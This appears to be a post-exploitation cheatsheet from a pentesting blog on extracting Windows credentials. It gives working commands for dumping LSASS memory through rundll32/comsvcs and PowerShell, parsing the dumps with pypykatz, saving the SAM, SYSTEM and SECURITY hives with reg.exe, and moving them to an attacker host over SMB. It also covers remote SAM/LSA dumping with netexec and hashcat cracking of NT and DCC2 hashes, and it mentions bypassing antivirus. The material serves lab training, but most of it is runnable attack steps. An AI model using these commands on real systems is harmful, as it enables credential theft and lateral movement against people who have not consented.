---
title: "Post-Exploitation: Extracting Credentials from the Registry and LSASS"
date: 2025-5-22
tags:
- lsass
- secretsdump
- mimikatz
description: "In addition to acquiring copies of the SAM database to extract and crack password hashes, we will also benefit from targeting the Local Security Authority Subsystem Service (LSASS)."
---



# _Overview

In addition to acquiring copies of the SAM database to extract and crack password hashes, we will also benefit from targeting the [Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service).

Upon initial logon, LSASS will:
- Cache credentials locally in memory
- Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Enforce security policies
- Write to Windows' [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)
Let's cover some of the techniques and tools we can use to dump LSASS memory and extract credentials from a target running Windows.
<!-- more -->


## Securable Objects
In Windows, **securable objects** are resources that the operating system protects through **Access Control Lists (ACLs)** and other security mechanisms. These objects can have permissions assigned to users or groups, allowing or denying access.

## LSASS Process Memory dump
Similar to the process of attacking the SAM database, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. K

### Through task manager
1. Open `Task Manager`
2. Select the `Processes` tab
3. Find and right click the `Local Security Authority Process`
4. Select `Create dump file`
![LSASS process memory structure and credential storage](../images/lasas.png)
A file called `lsass.DMP` is created and saved in `%temp%`. This is the file we will transfer to our attack host. 
# Through rundll32
This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.



With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`).

```
C:\> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

## Using Powershell
Before issuing the command to create the dump file, we must determine what process ID (`PID`) is assigned to `lsass.exe`. This can be done from cmd or PowerShell:
```powershell

# dump lsass
Get-Process lsass | Out-MiniDump C:\Temp\lsass.dmp

```

that most modern AV tools recognize this as malicious activity and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing


Now we can copy the dump file to our attack host and extract the credentials:
```shell
$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```
<br>

---

## What can be found inside an lsass dump 

#### MSV
```powershell
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. 
#### WDIGEST

```powershell
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

`WDIGEST` is an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. LSASS caches credentials used by WDIGEST in clear-text.
#### Kerberos

```powershell
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

[Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by Active Directory in Windows Domain environments.
Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. 
LSASS caches `passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos
#### DPAPI
```powershell
== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```
Mimikatz and Pypykatz can extract the DPAPI `masterkey` for logged-on users whose data is present in LSASS process memory. These masterkeys can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. covered in privEsc

### Crack the extracted NT hash
```shell
$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

## Security Registry Hives
# _Overview
With administrative access to a Windows system, one of the most effective post-exploitation techniques is to dump the Security Account Manager (SAM) database. The SAM stores hashed credentials for local user accounts and is a valuable target for attackers aiming to escalate privileges or move laterally within a network.

By extracting SAM, SYSTEM, and SECURITY hives from the target machine, we can transfer them to our attack host and perform offline hash cracking using tools such as Hashcat or John the Ripper, or even perform Pass-the-Hash attacks.

## Windows Registery Hives

There are three registry hives we can copy if we have` local administrative` access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes. A brief description of each is provided in the table below:

| Registry Hive   | Description                                                                                                                                                       |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `HKLM\SAM`      | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.                                        |
| `HKLM\SYSTEM`   | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.                                                |
| `HKLM\SECURITY` | Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |
|                 |                                                                                                                                                                   |

# hash differences

| Feature    | SAM (SAM + SYSTEM)            | LSA Secrets (SECURITY)                            |
| ---------- | ----------------------------- | ------------------------------------------------- |
| Focus      | Local account password hashes | Cached credentials & secrets (domain creds, etc.) |
| Format     | NTLM hashes                   | Plaintext or encrypted strings                    |
| Common Use | Crack local user passwords    |    

---

## cheatsheet

### Manually dumping the Registry hives

  `reg.exe` to save copies of the registry hives:
```powershell
> reg.exe save hklm\sam C:\sam.save

> reg.exe save hklm\system C:\system.save

> reg.exe save hklm\security C:\security.save
```

 copy to VM:
- create a smb share on attacking vm
```shell-session
$ impacket-smbserver -smb2support compdata /home/demise/mountshare
```

- move hives to share:
```powershell

C:\> move sam.save \\10.10.15.16\compdata
      

 move security.save \\10.10.15.16\compdata
       

 move system.save \\10.10.15.16\compdata
     
```

```shell-session
$ ls

sam.save  security.save  system.save
```
### Extracting hashes from hives with impacket

```shell
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::
```

 format:
```shell
uid:rid:lmhash:nthash
```

---

### Extracting SAM and LSA hashes Remotely using netexec
```shell
# dump LSA  hashes remotely (machine-secrets)
$ netexec smb 10.129.42.198 --local-auth -u bob -pattacker-password! --lsa

# dump SAM  hashes remotely (local-user-passwords)
$ netexec smb 10.129.42.198 --local-auth -u bob -pattacker-password! --sam
```
<br>

---


#### crack NT hash with hashcat 

```shell
$ hashcat -m 1000 c02478537b9727d391bc80011c2e2321 /usr/share/wordlists/rockyou.txt  -D 1 -O     
```


### cracking DCC2 Hash (from Security hive) 

hashed copies of network credential hashes. An example is:
```text
echoridge.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```
The Hashcat mode for cracking DCC2 hashes is `2100`.
```shell-session
$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

